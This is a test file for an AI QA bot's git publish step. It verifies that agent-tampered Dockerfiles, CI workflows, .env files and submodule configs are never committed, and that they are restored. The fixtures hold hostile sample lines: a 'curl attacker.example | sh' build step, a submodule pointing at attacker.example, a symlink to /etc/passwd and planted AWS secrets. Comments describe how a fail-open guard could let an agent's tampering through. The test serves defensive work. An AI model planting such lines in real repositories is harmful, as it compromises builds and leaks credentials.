// src/server/rewritten-engine-factory.publish-excludes.test.ts
//
// sdd/migration-remediation, Slice 2 (P0 publish-excludes) — D1 in
// docs/superpowers/2026-07-10-migration-remediation-decisions.md.
//
// REAL git-status fixture tests for E2E_PUBLISH_EXCLUDES / CODE_PUBLISH_EXCLUDES. The existing
// buildVcsPublish tests in rewritten-engine-factory.test.ts use a fake `git` fn that only records
// argv — that style is deliberately insufficient here: an array-membership assertion on the exclude
// config would have PASSED on the pre-fix anchoring bug (the string ".qa/coverage/" WAS already in
// the array; it just excluded nothing because of gitignore mid-pattern-slash anchoring). Only a real
// commit-content assertion, against a real throwaway git repo, proves the pattern actually excludes
// the real e2e/.qa/coverage/ path. `push` is intercepted (never shelled out — no real remote exists
// in a throwaway fixture repo); every other git subcommand (status/checkout/add/commit) runs for
// real, exercising buildVcsPublish's full publish() orchestration exactly as production wires it.
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, unlinkSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { buildVcsPublish } from "./rewritten-engine-factory";

// The bare git subcommand of an argv, skipping leading `-c <key> <value>` pairs (buildVcsPublish's
// commit/push decorations prepend -c flags) — mirrors rewritten-engine-factory.test.ts's own
// subcommandOf helper (duplicated locally; that file does not export it).
function subcommandOf(args: string[]): string | undefined {
  let i = 0;
  while (args[i] === "-c") i += 2;
  return args[i];
}

// A REAL git fn that shells out to git for every subcommand EXCEPT push (there is no real remote in
// a throwaway fixture repo) — push is captured, never executed, so buildVcsPublish's full publish()
// orchestration (write excludes -> status -> checkout -B -> add -> commit -> push) can run
// end-to-end against a real repo while staying network-free.
function realGitNoPush(defaultCwd: string): { git: (args: string[], cwd?: string) => Promise<string>; pushCalls: string[][] } {
  const pushCalls: string[][] = [];
  const git = async (args: string[], cwd: string = defaultCwd): Promise<string> => {
    if (subcommandOf(args) === "push") {
      pushCalls.push(args);
      return "";
    }
    try {
      return execFileSync("git", args, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).toString();
    } catch (e) {
      const err = e as { stdout?: string; stderr?: string };
      throw new Error(`git ${args.join(" ")} failed: ${err.stderr ?? err.stdout ?? String(e)}`);
    }
  };
  return { git, pushCalls };
}

// A throwaway repo with ONE base commit on the default branch — mirrors a real mirrorDir checkout.
// Every scenario branches off this baseline via buildVcsPublish's own `checkout -B`.
function initRepo(): string {
  const repo = mkdtempSync(join(tmpdir(), "qa-publish-excludes-"));
  const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
  const git = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
  git("init", "-q");
  git("config", "user.email", "t@t.com");
  git("config", "user.name", "t");
  writeFileSync(join(repo, "README.md"), "base\n");
  git("add", "README.md");
  git("commit", "-qm", "chore: base");
  return repo;
}

// Every file path committed in HEAD's own commit (vs. its parent) — the definitive "what got
// staged and pushed" evidence.
function committedPaths(repo: string): string[] {
  const out = execFileSync("git", ["show", "--pretty=format:", "--name-only", "HEAD"], { cwd: repo, encoding: "utf8" });
  return out.split("\n").map((l) => l.trim()).filter(Boolean);
}

function writeFile(repo: string, relPath: string, content = "{}\n"): void {
  const full = join(repo, relPath);
  mkdirSync(join(full, ".."), { recursive: true });
  writeFileSync(full, content);
}

// ── e2e target ───────────────────────────────────────────────────────────────────────────────────

test("e2e target: cross-repo service-context snapshot is never staged (leak fix, spec 'Cross-repo run does not leak service context into the PR diff')", async () => {
  const repo = initRepo();
  try {
    writeFile(repo, "e2e/checkout.spec.ts", "test('x', () => {});\n"); // legitimate control
    writeFile(repo, "e2e/.qa/service-context/other-repo/snapshot.json");

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(false, "diff", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/leaktest1", sha: "leaktest1" });

    assert.equal(result.changed, true, "the legitimate spec file must still register as a change");
    const paths = committedPaths(repo);
    assert.ok(paths.includes("e2e/checkout.spec.ts"), "the legitimate e2e spec must be staged");
    assert.ok(
      !paths.some((p) => p.startsWith("e2e/.qa/service-context/")),
      `service-context must never be staged into the suite PR — committed paths: ${JSON.stringify(paths)}`,
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("e2e target: coverage dumps and measured.json are excluded from a real staged commit (anchoring-bug fix)", async () => {
  const repo = initRepo();
  try {
    writeFile(repo, "e2e/checkout.spec.ts", "test('x', () => {});\n");
    writeFile(repo, "e2e/.qa/coverage/run-123/dump.json");
    writeFile(repo, "e2e/.qa/measured.json");

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(false, "diff", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/covtest1", sha: "covtest1" });

    assert.equal(result.changed, true);
    const paths = committedPaths(repo);
    assert.ok(paths.includes("e2e/checkout.spec.ts"));
    assert.ok(
      !paths.some((p) => p.startsWith("e2e/.qa/coverage/")),
      `coverage dumps must be excluded — pre-fix ".qa/coverage/" is anchored to the repo root (mid-pattern slash) and matches nothing under e2e/ — committed paths: ${JSON.stringify(paths)}`,
    );
    assert.ok(
      !paths.includes("e2e/.qa/measured.json"),
      `measured.json must be excluded — committed paths: ${JSON.stringify(paths)}`,
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("e2e target: node_modules/ (unprefixed, no mid-pattern slash) still excludes at ANY depth, including nested under e2e/ — existing legitimate exclude remains intact", async () => {
  const repo = initRepo();
  try {
    writeFile(repo, "e2e/checkout.spec.ts", "test('x', () => {});\n");
    writeFile(repo, "e2e/node_modules/some-pkg/index.js", "module.exports = {};\n");

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(false, "diff", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/nmtest1", sha: "nmtest1" });

    assert.equal(result.changed, true);
    const paths = committedPaths(repo);
    assert.ok(paths.includes("e2e/checkout.spec.ts"));
    assert.ok(
      !paths.some((p) => p.startsWith("e2e/node_modules/")),
      `node_modules/ must exclude at ANY depth (no leading/mid slash), including nested under e2e/ — committed paths: ${JSON.stringify(paths)}`,
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

// ── FIX 2 (sdd/security-hardening, judgment-day round 2, CRITICAL — arbitrated) — the tracked guard
// was wired ONLY for isCode, reasoning "the e2e target's addDir=['e2e'] can never stage a repo-root
// denylisted path, so wiring the guard there would be a no-op". TRUE for the root-anchored entries
// (Dockerfile, .github/, docker-compose*, .gitattributes, .gitmodules) — FALSE for `*.env`, which
// CONFINEMENT_DENYLIST's own isCodeDenied matches via a tree-wide SUFFIX check
// (`f.endsWith(".env")`), not a root anchor. A tracked `e2e/fixtures/creds.env` an agent modifies to
// embed a live secret is denylisted by that suffix rule and must never be published on the e2e
// target either. ─────────────────────────────────────────────────────────────────────────────────

test("e2e target: a TRACKED, agent-modified e2e/fixtures/creds.env is never published (the guard must be wired for e2e too — *.env is a tree-wide suffix match, not root-anchored)", async () => {
  const originalEnv = "FIXTURE_BASE_URL=http://localhost:3000\n";
  const repo = mkdtempSync(join(tmpdir(), "qa-publish-e2e-tracked-env-"));
  try {
    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
    gitSync("init", "-q");
    gitSync("config", "user.email", "t@t.com");
    gitSync("config", "user.name", "t");
    writeFile(repo, "e2e/checkout.spec.ts", "test('x', () => {});\n");
    writeFile(repo, "e2e/fixtures/creds.env", originalEnv); // already tracked, exactly like a real watched repo's own fixture
    gitSync("add", "-A");
    gitSync("commit", "-qm", "chore: base with tracked e2e fixture env");

    // Agent tampers with the already-tracked fixture, embedding a live secret.
    writeFile(repo, "e2e/fixtures/creds.env", `${originalEnv}AWS_SECRET_ACCESS_KEY=AKIAABCDEFGHIJKLMNOP\n`);
    writeFile(repo, "e2e/login.spec.ts", "test('y', () => {});\n"); // legitimate control

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(false, "diff", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/e2eenvtest1", sha: "e2eenvtest1" });

    assert.equal(result.changed, true, "the legitimate new spec must still register as a change");
    const paths = committedPaths(repo);
    assert.ok(paths.includes("e2e/login.spec.ts"), "a legitimate new e2e spec must still be staged");
    assert.ok(
      !paths.includes("e2e/fixtures/creds.env"),
      `a tampered TRACKED e2e/fixtures/creds.env must never be published — committed paths: ${JSON.stringify(paths)}`,
    );
    assert.equal(
      readFileSync(join(repo, "e2e/fixtures/creds.env"), "utf8"),
      originalEnv,
      "e2e/fixtures/creds.env working-tree content must be restored to HEAD, not left tampered with the embedded secret",
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

// ── no-false-positive checks: every OTHER root-anchored denylist entry, when placed under e2e/,
// must NOT match (Dockerfile is exact-match, .github/ is a dir-prefix, docker-compose* is a
// prefix — none of them are tree-wide, so an e2e/-nested path never collides) ─────────────────────

test("e2e target (negative): e2e/Dockerfile, e2e/.github/workflows/x.yml and e2e/docker-compose.yml are legitimate e2e content and are still published (root-anchored entries do not falsely match under e2e/)", async () => {
  const repo = initRepo();
  try {
    writeFile(repo, "e2e/checkout.spec.ts", "test('x', () => {});\n");
    writeFile(repo, "e2e/Dockerfile", "FROM node:24\n"); // legitimate e2e-owned fixture, not root-anchored
    writeFile(repo, "e2e/.github/workflows/x.yml", "name: fixture\n");
    writeFile(repo, "e2e/docker-compose.yml", "services: {}\n");

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(false, "diff", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/e2enofalsepos1", sha: "e2enofalsepos1" });

    assert.equal(result.changed, true);
    const paths = committedPaths(repo);
    for (const legit of ["e2e/checkout.spec.ts", "e2e/Dockerfile", "e2e/.github/workflows/x.yml", "e2e/docker-compose.yml"]) {
      assert.ok(paths.includes(legit), `${legit} is legitimate e2e content and must still be published — committed paths: ${JSON.stringify(paths)}`);
    }
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

// ── code target ──────────────────────────────────────────────────────────────────────────────────

test("code target: workflow/Dockerfile/compose/gitattributes/gitmodules are never staged (code-denylist mirror, D2)", async () => {
  const repo = initRepo();
  try {
    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n"); // legitimate control
    writeFile(repo, ".github/workflows/ci.yml", "name: ci\n");
    writeFile(repo, "Dockerfile", "FROM node:24\n");
    writeFile(repo, "docker-compose.override.yml", "services: {}\n");
    writeFile(repo, ".gitattributes", "* text=auto\n");
    writeFile(repo, ".gitmodules", '[submodule "x"]\n');

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(true, "diff", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/codetest1", sha: "codetest1" });

    assert.equal(result.changed, true);
    const paths = committedPaths(repo);
    assert.ok(paths.includes("src/orders.test.ts"), "a legitimate source/test file must still be staged");
    for (const denied of [".github/workflows/ci.yml", "Dockerfile", "docker-compose.override.yml", ".gitattributes", ".gitmodules"]) {
      assert.ok(!paths.includes(denied), `${denied} must never be staged into a code-target PR — committed paths: ${JSON.stringify(paths)}`);
    }
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("code target: cross-repo service-context snapshot is never staged either (spec requires BOTH targets, not just e2e)", async () => {
  const repo = initRepo();
  try {
    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
    writeFile(repo, "e2e/.qa/service-context/other-repo/snapshot.json");

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(true, "diff", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/codeleaktest1", sha: "codeleaktest1" });

    assert.equal(result.changed, true);
    const paths = committedPaths(repo);
    assert.ok(paths.includes("src/orders.test.ts"));
    assert.ok(
      !paths.some((p) => p.startsWith("e2e/.qa/service-context/")),
      `code-target publish stages the whole tree ("."), so service-context must be excluded there too — committed paths: ${JSON.stringify(paths)}`,
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("code target: .env* files remain excluded (regression guard — unrelated to this fix, must not break)", async () => {
  const repo = initRepo();
  try {
    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n");
    writeFile(repo, ".env.local", "SECRET=1\n");

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(true, "diff", git);
    await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/envtest1", sha: "envtest1" });

    const paths = committedPaths(repo);
    assert.ok(paths.includes("src/orders.test.ts"));
    assert.ok(!paths.includes(".env.local"), `.env.local must remain excluded — committed paths: ${JSON.stringify(paths)}`);
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

// ── tracked-file gap (SECURITY CRITICAL): gitignore-style excludes only suppress UNTRACKED paths —
// a denylisted file that is ALREADY TRACKED (every real Dockerfile/.github/workflows/* in a watched
// repo IS tracked) and gets agent-MODIFIED is invisible to CODE_PUBLISH_EXCLUDES/.git/info/exclude.
// The only other guard was the runtime WriteConfinementAdapter.enforce() call, which RunQaUseCase
// wraps in a documented FAIL-OPEN try/catch (D-P0b) — if it throws for any reason (e.g. an
// unrecognized git path-quoting escape sequence), the tampered tracked file survives to this
// publish step untouched and CODE_PUBLISH_ADD=["."] stages/commits it into the watched repo's PR.
// This is a SECOND, independent, deterministic guard at commit time — it does not depend on
// enforce() having run or succeeded at all. ──────────────────────────────────────────────────────

test("code target: a TRACKED, agent-modified Dockerfile/workflow file is never published, even with the exclude list active (gitignore excludes only suppress UNTRACKED paths)", async () => {
  const originalDockerfile = "FROM node:24\n";
  const originalWorkflow = "name: ci\n";
  const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-"));
  try {
    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
    gitSync("init", "-q");
    gitSync("config", "user.email", "t@t.com");
    gitSync("config", "user.name", "t");
    writeFile(repo, "README.md", "base\n");
    // These already exist in the base commit — TRACKED, exactly like a real watched repo's own
    // Dockerfile/CI workflow (never untracked in practice).
    writeFile(repo, "Dockerfile", originalDockerfile);
    writeFile(repo, ".github/workflows/ci.yml", originalWorkflow);
    gitSync("add", "-A");
    gitSync("commit", "-qm", "chore: base with tracked infra files");

    // Agent tampers with the ALREADY-TRACKED denylisted files — the exact scenario the exclude
    // list (a gitignore mechanism, untracked-only) cannot suppress.
    writeFile(repo, "Dockerfile", "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
    writeFile(repo, ".github/workflows/ci.yml", "name: pwned\non: push\njobs: {}\n");
    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n"); // legitimate control

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(true, "diff", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/trackedtest1", sha: "trackedtest1" });

    assert.equal(result.changed, true, "the legitimate new file must still register as a change");
    const paths = committedPaths(repo);
    assert.ok(paths.includes("src/orders.test.ts"), "a legitimate source/test file must still be staged");
    assert.ok(
      !paths.includes("Dockerfile"),
      `a tampered TRACKED Dockerfile must never be published — committed paths: ${JSON.stringify(paths)}`,
    );
    assert.ok(
      !paths.includes(".github/workflows/ci.yml"),
      `a tampered TRACKED workflow file must never be published — committed paths: ${JSON.stringify(paths)}`,
    );

    // Defense-in-depth: the tamper must actually be REVERTED on disk, not merely left unstaged —
    // an unstaged tamper would resurface and get staged on the very next publish attempt.
    assert.equal(
      readFileSync(join(repo, "Dockerfile"), "utf8"),
      originalDockerfile,
      "Dockerfile working-tree content must be restored to HEAD, not left tampered",
    );
    assert.equal(
      readFileSync(join(repo, ".github/workflows/ci.yml"), "utf8"),
      originalWorkflow,
      "workflow working-tree content must be restored to HEAD, not left tampered",
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

// ── FIX 1 (sdd/security-hardening, judgment-day round 2): the tracked guard used
// `--diff-filter=M`, so a DELETED tracked denylisted file, a tracked file TYPECHANGED into a
// symlink, or a rename INTO a denylisted destination all produced EMPTY `git diff --cached
// --name-only --diff-filter=M` output while being staged and committed — the comment's own
// justification ("added/deleted already caught by the exclude-file guard") is FALSE for a
// DELETION: gitignore excludes only stop untracked paths being ADDED, they never stop staging
// the deletion of an already-tracked path. These three fixtures pin the fix: check EVERY staged
// path regardless of status, never re-enumerate git status codes. ──────────────────────────────

test("code target: a TRACKED Dockerfile DELETED by the agent is never published as a deletion (D status was invisible to --diff-filter=M)", async () => {
  const originalDockerfile = "FROM node:24\n";
  const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-del-"));
  try {
    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
    gitSync("init", "-q");
    gitSync("config", "user.email", "t@t.com");
    gitSync("config", "user.name", "t");
    writeFile(repo, "README.md", "base\n");
    writeFile(repo, "Dockerfile", originalDockerfile);
    gitSync("add", "-A");
    gitSync("commit", "-qm", "chore: base with tracked Dockerfile");

    // Agent DELETES the already-tracked Dockerfile — a supply-chain-relevant tamper (removing a
    // pinned base image / build step) just as dangerous as modifying it.
    unlinkSync(join(repo, "Dockerfile"));
    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n"); // legitimate control

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(true, "diff", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/deltest1", sha: "deltest1" });

    assert.equal(result.changed, true, "the legitimate new file must still register as a change");
    const trackedAtHead = execFileSync("git", ["ls-tree", "-r", "--name-only", "HEAD"], { cwd: repo, encoding: "utf8" }).split("\n");
    assert.ok(trackedAtHead.includes("Dockerfile"), "Dockerfile's staged DELETION must be reverted before commit — it must still be tracked at HEAD");
    assert.equal(
      readFileSync(join(repo, "Dockerfile"), "utf8"),
      originalDockerfile,
      "Dockerfile working tree content must be restored, not left deleted",
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("code target: a TRACKED workflow file TYPECHANGED into a symlink is never published (T status was invisible to --diff-filter=M)", async () => {
  const originalWorkflow = "name: ci\n";
  const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-typechange-"));
  try {
    const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
    const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
    gitSync("init", "-q");
    gitSync("config", "user.email", "t@t.com");
    gitSync("config", "user.name", "t");
    writeFile(repo, "README.md", "base\n");
    writeFile(repo, ".github/workflows/ci.yml", originalWorkflow);
    gitSync("add", "-A");
    gitSync("commit", "-qm", "chore: base with tracked workflow");

    // Agent replaces the tracked workflow file with a symlink (typechange, "T" status).
    unlinkSync(join(repo, ".github", "workflows", "ci.yml"));
    symlinkSync("/etc/passwd", join(repo, ".github", "workflows", "ci.yml"));
    writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n"); // legitimate control

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(true, "diff", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/typechangetest1", sha: "typechangetest1" });

    assert.equal(result.changed, true);
    assert.equal(
      readFileSync(join(repo, ".github", "workflows", "ci.yml"), "utf8"),
      originalWorkflow,
      "the workflow file must be restored to its original tracked content, not left as a symlink",
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

// Note: a "rename INTO a denylisted destination" fixture at THIS (integration) level would be a
// false test for the code target specifically — CODE_PUBLISH_EXCLUDES already spreads the WHOLE
// CONFINEMENT_DENYLIST into .git/info/exclude (see this file's own CODE_PUBLISH_EXCLUDES doc), so a
// brand-new path named e.g. "Dockerfile" is already invisible to `git add`/`git status` as a
// gitignored untracked file — defense #1 (the exclude file) already blocks it, and git therefore
// never even reports an "R" status for the pairing (only a plain "D" for the origin — the
// destination is never staged at all). The R-status revert-as-a-unit logic added to
// VcsWriteAdapter.commit() (FIX 1) is exercised directly, at the adapter level, in
// vcs-write.adapter.test.ts — that test bypasses this file's exclude-list layer, which is the
// correct isolation boundary for pinning commit()'s OWN diff-parsing correctness rather than this
// composition's incidental double coverage.

// ── ALSO (judgment-day round 2): the tracked-M fixture above only proved 2 of the ~9
// CONFINEMENT_DENYLIST entries (Dockerfile, .github/workflows/*) — table-driven across the WHOLE
// denylist so every entry is pinned by a real git fixture, not just the two the original slice
// happened to pick. ──────────────────────────────────────────────────────────────────────────────

const DENYLIST_TRACKED_MODIFY_CASES: { path: string; original: string; tampered: string }[] = [
  { path: ".env", original: "BASE=1\n", tampered: "BASE=1\nAWS_SECRET_ACCESS_KEY=leaked\n" },
  { path: ".env.production", original: "BASE=1\n", tampered: "BASE=1\nAWS_SECRET_ACCESS_KEY=leaked\n" },
  { path: "config/secrets.env", original: "BASE=1\n", tampered: "BASE=1\nAWS_SECRET_ACCESS_KEY=leaked\n" },
  { path: "Dockerfile", original: "FROM node:24\n", tampered: "FROM node:24\nRUN curl https://attacker.example/x | sh\n" },
  { path: ".github/workflows/ci.yml", original: "name: ci\n", tampered: "name: pwned\non: push\njobs: {}\n" },
  { path: "docker-compose.override.yml", original: "services: {}\n", tampered: "services:\n  evil: {}\n" },
  { path: ".gitattributes", original: "* text=auto\n", tampered: "* text=auto\n*.sh filter=evil\n" },
  { path: ".gitmodules", original: '[submodule "x"]\n', tampered: '[submodule "evil"]\n\tpath = evil\n\turl = https://attacker.example/evil\n' },
];

for (const { path: denyPath, original, tampered } of DENYLIST_TRACKED_MODIFY_CASES) {
  test(`code target: TRACKED, agent-modified '${denyPath}' is reverted (whole-denylist table, judgment-day round 2)`, async () => {
    const repo = mkdtempSync(join(tmpdir(), "qa-publish-tracked-table-"));
    try {
      const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
      const gitSync = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
      gitSync("init", "-q");
      gitSync("config", "user.email", "t@t.com");
      gitSync("config", "user.name", "t");
      writeFile(repo, "README.md", "base\n");
      writeFile(repo, denyPath, original);
      gitSync("add", "-A");
      gitSync("commit", "-qm", "chore: base with tracked infra file");

      writeFile(repo, denyPath, tampered);
      writeFile(repo, "src/orders.test.ts", "test('x', () => {});\n"); // legitimate control

      const { git } = realGitNoPush(repo);
      const vcsWrite = buildVcsPublish(true, "diff", git);
      const result = await vcsWrite.publish({ mirrorDir: repo, branch: `qa-bot/tabletest-${denyPath.replace(/[^a-z0-9]/gi, "")}`, sha: "tabletest1" });

      assert.equal(result.changed, true, "the legitimate new file must still register as a change");
      const paths = committedPaths(repo);
      assert.ok(paths.includes("src/orders.test.ts"));
      assert.ok(!paths.includes(denyPath), `'${denyPath}' must never be published — committed paths: ${JSON.stringify(paths)}`);
      assert.equal(readFileSync(join(repo, denyPath), "utf8"), original, `'${denyPath}' working-tree content must be restored to HEAD, not left tampered`);
    } finally {
      rmSync(repo, { recursive: true, force: true });
    }
  });
}

// ── context target (sdd/migration-remediation Slice 7.2, verify-first spike -> confirmed fix) ─────
// CONFIRMED DEFECT: buildVcsPublish(isCode) previously dispatched ONLY on isCode. Context-mode runs
// are never isCode (they are e2e-shaped), so a context-mode run reaching "pr" fell through to
// E2E_PUBLISH_ADD (["e2e"]), staging the WHOLE e2e/ tree — seed fixtures, specs, everything —
// instead of just the FE<->BE architecture map. Legacy oracle: src/integrations/publish.ts's
// publishContext, whose CONTEXT_ADD = ["e2e/.qa/context.json"] stages ONLY that one file.

test("context target: a context-mode publish stages ONLY e2e/.qa/context.json, never e2e specs or seed fixtures (Slice 7.2 fix)", async () => {
  const repo = initRepo();
  try {
    writeFile(repo, "e2e/.qa/context.json", '{"routes":[]}\n'); // the ONLY file a context-mode publish should ever stage
    writeFile(repo, "e2e/checkout.spec.ts", "test('x', () => {});\n"); // must NOT be staged by a context-mode publish
    writeFile(repo, "e2e/playwright.config.ts", "export default {};\n"); // seed fixture — must NOT be staged either

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(false, "context", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/contexttest1", sha: "contexttest1" });

    assert.equal(result.changed, true, "the context.json change must register");
    const paths = committedPaths(repo);
    assert.deepEqual(paths, ["e2e/.qa/context.json"], `a context-mode publish must stage ONLY the context artifact — committed paths: ${JSON.stringify(paths)}`);
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("context target: no changes to context.json -> reports changed:false even when other e2e/ files changed (scoped status check, not a whole-e2e/ scan)", async () => {
  const repo = initRepo();
  try {
    writeFile(repo, "e2e/checkout.spec.ts", "test('x', () => {});\n"); // an e2e/ change that is NOT the context artifact

    const { git } = realGitNoPush(repo);
    const vcsWrite = buildVcsPublish(false, "context", git);
    const result = await vcsWrite.publish({ mirrorDir: repo, branch: "qa-bot/contexttest2", sha: "contexttest2" });

    assert.equal(result.changed, false, "a context-mode publish must only observe changes to e2e/.qa/context.json, not the wider e2e/ tree");
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});
